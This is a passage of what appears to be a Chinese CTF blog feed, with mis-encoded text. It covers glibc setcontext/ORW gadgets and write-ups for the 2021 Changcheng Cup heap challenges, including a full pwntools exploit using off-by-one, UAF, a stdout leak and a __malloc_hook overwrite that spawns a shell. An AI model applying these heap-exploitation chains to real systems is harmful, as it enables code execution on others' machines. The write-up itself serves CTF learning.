ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure><p>ä¾‹é¢˜æŸ¥çœ‹æˆ‘ä¹‹å‰çš„æ¯”èµ›å¤ç°é¢˜ç›®ï¼š<code>K1ng_in_h3Ap_II</code>ï¼Œ<code>Whats your name</code></p><h3 id="é«˜ç‰ˆæœ¬"><a href="#é«˜ç‰ˆæœ¬" class="headerlink" title="é«˜ç‰ˆæœ¬"></a>é«˜ç‰ˆæœ¬</h3><p>ä½†åœ¨ <code>Glibc 2.29</code>ä¹‹å <code>setcontext</code>ä¸­çš„gadgetå˜æˆäº†ä»¥ <code>rdx</code>ç´¢å¼•ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æŒ‰ç…§ä¹‹å‰æ€è·¯çš„è¯ï¼Œè¿˜è¦å…ˆé€šè¿‡ <code>ROP</code>æ§åˆ¶ <code>RDX</code>çš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, [rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure><h3 id="gadget1"><a href="#gadget1" class="headerlink" title="gadget1"></a>gadget1</h3><p>è¿™å…¶ä¸­ç”¨åˆ°çš„ <code>gadget</code>æ˜¯ <code>getkeyserv_handle+576</code>ï¼Œå…¶æ±‡ç¼–å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>gadget</code>å¯ä»¥é€šè¿‡ <code>rdi</code> æ¥æ§åˆ¶ <code>rdx</code>ï¼Œ éå¸¸å¥½ç”¨ï¼Œè€Œä¸”ä» Glibc2.29åˆ°2.32éƒ½å¯ç”¨</p><p>æ§åˆ¶ <code>rdx</code>ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ <code>setcontext</code>æ¥æ§åˆ¶å…¶ä»–å¯„å­˜å™¨äº†</p><h3 id="gadget2"><a href="#gadget2" class="headerlink" title="gadget2"></a>gadget2</h3><p>é€šè¿‡ gadgetæ§åˆ¶rbpçš„å€¼ï¼Œä»è€Œè¿›è¡Œæ ˆè¿ç§»ï¼Œå°†æ ˆåŠ«æŒåˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †åœ°å€ä¸Šï¼Œå¹¶æ‰§è¡Œé¢„å…ˆå¸ƒç½®çš„ropé“¾ï¼Œä»è€Œè·å–flag</p><p>å…ˆä»‹ç»ä¸€ä¸‹ä¸‡é‡‘æ²¹çš„gadget <code>svcudp_reply+26</code>ï¼Œæ±‡ç¼–å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªgadgetsä¸»è¦æ˜¯é€šè¿‡ <code>rdi</code>æ§åˆ¶ <code>rbp</code>è¿›è€Œæ§åˆ¶ <code>rax</code>å¹¶æ‰§è¡Œè·³è½¬ï¼Œç”±äºæˆ‘ä»¬å·²ç»æ§åˆ¶äº† <code>rbp</code>çš„å€¼ï¼Œå› æ­¤åªéœ€è¦åœ¨ <code>rax+0x28</code>çš„ä½ç½®éƒ¨ç½² <code>leaveï¼›ret</code>å³å¯å®Œæˆæ ˆè¿ç§»</p><p>ä»è€Œåœ¨æˆ‘ä»¬å·²ç»å¸ƒç½®å¥½ <code>orw ropé“¾</code>çš„ä½ç½®ä¼ªé€ æ ˆåœ°å€å¹¶åŠ«æŒæ§åˆ¶æµï¼Œæœ€ç»ˆè¯»å–<code>flag</code></p><h3 id="gadget3"><a href="#gadget3" class="headerlink" title="gadget3"></a>gadget3</h3><p>åœ¨gadget2ä¸­æ˜¯é€šè¿‡gadgetsè¿›è¡Œæ ˆè¿ç§»ï¼Œå°†åŸæœ¬çš„æ ˆåœ°å€åŠ«æŒåˆ°äº†å †ä¸Šï¼Œä½†å¦‚æœæ ˆåœ°å€å·²çŸ¥çš„è¯ï¼Œè§£é¢˜è¿‡ç¨‹ä¼šæ›´åŠ ç®€å•ï¼Œè€Œä¸”ä¸éœ€è¦ç‰¹æ„å»å¯»æ‰¾gadgetsï¼Œé‚£ä¹ˆå¦‚ä½•æ³„éœ²æ ˆåœ°å€å‘¢ï¼Ÿå…¶å®ç¨‹åºçš„æ ˆåœ°å€ä¼šå­˜æ”¾åœ¨ <code>environ</code>ä¸­ï¼Œæˆ‘ä»¬åªè¦è¾“å‡º<code>environ</code>çš„å†…å®¹å°±èƒ½è·å–æ ˆåœ°å€</p><p>æ¥æºï¼š<a href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p><p>â€‹            <a href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p><p>â€‹            <a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯å‰ç½®&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯å‰ç½®&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯å‰ç½®&quot;&gt;&lt;/a&gt;èƒŒæ™¯å‰ç½®&lt;/h2&gt;&lt;p&gt;seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ Linux kernel ä»2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€</summary>
      
    
    
    
    
    <category term="orw" scheme="http://example.com/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>2021é•¿åŸæ¯PWN</title>
    <link href="http://example.com/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-09-21T04:07:10.000Z</published>
    <updated>2021-10-13T08:01:24.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡ä¸€å…±ä¸‰é¢˜pwnï¼Œä¸¤é¢˜å…¶å®éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„å †é¢˜ï¼Œå¯æƒœåªåšå‡ºäº†ä¸€é¢˜ï¼Œè¿˜æœ‰ä¸€é¢˜å †ä¸Šçš„orwåœ¨æ¯”èµ›å‰æ²¡èƒ½å‡º ã€‚ä¸è¿‡æ€»çš„æ¥è¯´ï¼šæ¯”ä¹‹å‰è¿˜æ˜¯è¿›æ­¥äº†å¾ˆå¤šï¼ŒåŠ æ²¹</p><h2 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h2><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161053043.png" alt="image-20210921161053043"></p><p>æ¯«æ— ç–‘é—®çš„64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p>ç¨‹åºä¸€å…±æœ‰ç€ä¸‰ä¸ªåŠŸèƒ½ä»¥åŠä¸€ä¸ªå¥½å¿ƒé€æˆ‘ä»¬çš„ä¸‰å­—èŠ‚libcåœ°å€</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161202941.png" alt="image-20210921161202941"></p><p>è¾“å…¥666ä¼šæ‰“å°å‡ºåä¸‰å­—èŠ‚åœ°å€</p><p>ç”³è¯·å †å—æ²¡æœ‰ç‰¹æ®Šçš„ï¼Œåªæ˜¯ä¸èƒ½ç”³è¯·å¤§äº0xF0çš„å †å—</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161426698.png" alt="image-20210921161426698"></p><p>å†™å…¥åŠŸèƒ½å­˜åœ¨ç€offbyoneï¼Œè¿˜è¦æ³¨æ„çš„å°±æ˜¯äº¤äº’è¦è¾“å…¥â€™\nâ€™æ‰èƒ½ç»“æŸï¼Œå¦åˆ™å°±è¦è¾“å…¥å®Œæ‰€æœ‰é•¿åº¦æ•°æ®</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161337239.png" alt="image-20210921161337239"></p><p>é‡Šæ”¾åŠŸèƒ½å­˜åœ¨UAF</p><p>æ‰€ä»¥æˆ‘çš„æ€è·¯æ˜¯å€Ÿç€offbyoneç”Ÿæˆunsorted chunkï¼Œå¾—åˆ°libcåœ°å€ï¼Œç„¶åå†å°†ä»–åˆ†ä¸ºä¸€å—å¤§å°ä¸ºä¸º0x70çš„fast chunkï¼Œå€Ÿç”¨UAFå¯¹ç€libcåä¸‰ä½è¿›è¡Œè¦†ç›–ï¼Œè¦†ç›–æˆstdoutçš„åœ°å€ï¼Œå°†å †å—åˆ†é…åˆ°stdoutä¸Šï¼Œåå‡ºlibcåœ°å€ã€‚ç„¶åæ•…æŠ€é‡æ–½ï¼Œå†åˆ†é…åˆ°__malloc_hookä¸Šï¼Œä½†æ˜¯è¿˜è¦å€Ÿç”¨rellocè°ƒæ•´ä¸€ä¸‹æ‰è¡Œ</p><p>çœ‹äº†åˆ«äººçš„wpï¼Œå¯¹äºç¬¬ä¸€æ¬¡æŠŠchunkåˆ†é…åˆ°stdoutè¿˜æœ‰åˆ«çš„æ€è·¯ï¼šå…ˆé‡Šæ”¾ä¸€å—unsorted chunkï¼Œç„¶åç”³è¯·å›æ¥0x70å¤§å°çš„fast chunkï¼Œæ­¤æ—¶è¿™å—chunkä¸Šä¹Ÿæ˜¯ä¼šæ®‹ç•™ç€libcåœ°å€ï¼ˆæ­£å¸¸çš„mallocæ˜¯ä¸ä¼šæ¸…é›¶çš„ï¼‰ï¼Œç„¶åé‡Šæ”¾ä¸¤ä¸ªfast chunkè¿›å…¥biné“¾ï¼Œå°†åè¿›çš„é‚£å—ï¼Œå€Ÿç”¨UAFæŠŠfdæŒ‡é’ˆä¿®æ”¹æˆæŒ‡å‘æœ‰ç€libcåœ°å€çš„é‚£ä¸ªchunkï¼Œè¿™æ—¶ä¹Ÿèƒ½å°†å †å—ç”³è¯·åˆ°stdoutä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input context:&quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>) <br>log.success(<span class="hljs-built_in">hex</span>(addr))<br>stdout = (addr + <span class="hljs-number">0x36FE10</span>) &amp; <span class="hljs-number">0xFFFFFF</span><br>log.info(<span class="hljs-string">&quot;stdout==&gt;0x%x&quot;</span> %stdout)<br>low = stdout &amp; <span class="hljs-number">0xFFFF</span><br>high = (stdout &gt;&gt; <span class="hljs-number">16</span>) &amp;<span class="hljs-number">0xFF</span><br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>log.info(<span class="hljs-string">&quot;high==&gt;0x%x&quot;</span> %high)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">2</span>,p16(low - <span class="hljs-number">0x43</span>) + p8(high))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> <br>edit(<span class="hljs-number">4</span>,payload)<br>p.recv(<span class="hljs-number">0x40</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5600</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">3</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;__libc_realloc==&gt;0x%x&quot;</span> %realloc)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) + p64(ogg) + p64(realloc+<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">5</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h2><p>æ¥æºï¼š<a href="https://blog.csdn.net/eeeeeight/article/details/120386415">https://blog.csdn.net/eeeeeight/article/details/120386415</a></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921163803827.png" alt="image-20210921163803827"></p><p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€ã€‚åœ¨ç¨‹åºä¸Šè·Ÿä¸Šé¢˜æ˜¯å·®ä¸å¤šçš„ï¼Œå°‘äº†666çš„åœ°å€æ³„éœ²ä»¥åŠoffbyoneæ¼æ´ï¼Œä½†æ˜¯å¤šäº†æ‰“å°åŠŸèƒ½ï¼Œä»¥åŠlibcç‰ˆæœ¬æå‡è‡³2.27ï¼Œè‡³äº2.27ï¼Œå°±æ˜¯æ ‡å¿—æ€§çš„tcache bin</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922131449936.png" alt="image-20210922131449936"></p><p>ç„¶åç”³è¯·çš„sizeåªèƒ½æ˜¯åœ¨0x10~0x60</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132037509.png" alt="image-20210922132037509"></p><p>UAFä¾ç„¶å­˜åœ¨</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132136392.png" alt="image-20210922132136392"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132215898.png" alt="image-20210922132215898"></p><p>å¤šäº†ä¸€å±‚æ²™ç®±ï¼Œçœ‹åˆ°è¿™ä¸ªåŸºæœ¬éƒ½æ˜¯orwçš„æ€è·¯ï¼šå€Ÿç”¨setcontext + 53ä¸Šçš„gadgetsï¼Œè°ƒç”¨mprotectä½¿å¾—å †å¯æ‰§è¡Œï¼Œç„¶åæ‰§è¡Œå¸ƒç½®åœ¨å †ä¸Šçš„ropé“¾ï¼Œè¯»å–flag</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132710147.png" alt="image-20210922132710147"></p><p>ç”³è¯·0x50çš„å †å—æ˜¯å› ä¸ºé“¾ä¸Šæ²¡æœ‰0x60çš„ç©ºé—²å †å—ï¼Œæ‰€ä»¥ç”³è¯·å‡ºæ¥çš„å †å—æ˜¯åœ¨æœ€åº•ä¸‹çš„ï¼ˆä¸top chunkç›¸è¿‘çš„ï¼‰å¹¶ä¸”ä¸¤å—æ˜¯è¿ç»­çš„ï¼Œå¥½ç®—åç§»</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133019126.png" alt="image-20210922133019126"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133236908-16322992251781.png" alt="image-20210922133236908"></p><p>ç„¶åå…ˆåé‡Šæ”¾ï¼Œå€Ÿç”¨UAFæ³„éœ²å‡ºå †ä¸Šåœ°å€ï¼Œè¿›è€Œè®¡ç®—tcacheåœ°å€</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162651147.png" alt="image-20210922162651147"></p><p>ç„¶åæŠŠæˆ‘ä»¬ä¹‹åè¦ç”³è¯·ç”¨åˆ°çš„å †å—çš„countæ•°é‡æ”¹ä¸º2ï¼Œä»¥åŠæŠŠunsorted chunkçš„countå…¨éƒ¨ä¸€æ¬¡æ€§æ”¹ä¸º7ï¼Œä¸ºåç»­é‡Šæ”¾unsorted chunkè¿›å…¥biné“¾æ³„éœ²libcåŸºå€åšå·¥ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ä¿®æ”¹tcache bin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+<span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap=leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr=leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162838313.png" alt="image-20210922162838313"></p><p>ä¿®æ”¹ä¹‹å‰é‡Šæ”¾å †å—çš„fdæŒ‡é’ˆæŒ‡å‘0x20å †å—ï¼Œè€Œå‰é¢ä¹Ÿä¿®æ”¹äº†0x60å †å—çš„countæ•°é‡ä¸º2ï¼Œæ‰€ä»¥å¯ä»¥ç”³è¯·ï¼Œé€ æˆoverlapï¼Œä¹‹åä¿®æ”¹0x20å †å—çš„sizeï¼Œç”³è¯·0x30çš„å †å—ï¼Œï¼ˆåŸå› æ˜¯è¿™ä¸ªå¤§å°çš„å †å—æ˜¯ä¸å­˜åœ¨ç©ºé—²çš„å †å—ï¼Œæ‰€ä»¥å¯ä»¥å…¨éƒ¨ç›¸é‚»åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿æ“ä½œï¼‰ã€‚æŠŠåº•ä¸‹çš„å †å—éƒ½åŒ…å«åœ¨å†…ï¼Œè®°å¾—è¦ç•™ä¸€ä¸ªé˜²æ­¢ä¸top chunkè¿›è¡Œåˆå¹¶</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163245528.png" alt="image-20210922163245528"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163344836.png" alt="image-20210922163344836"></p><p>ç„¶åé‡Šæ”¾å¾—åˆ°libcåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 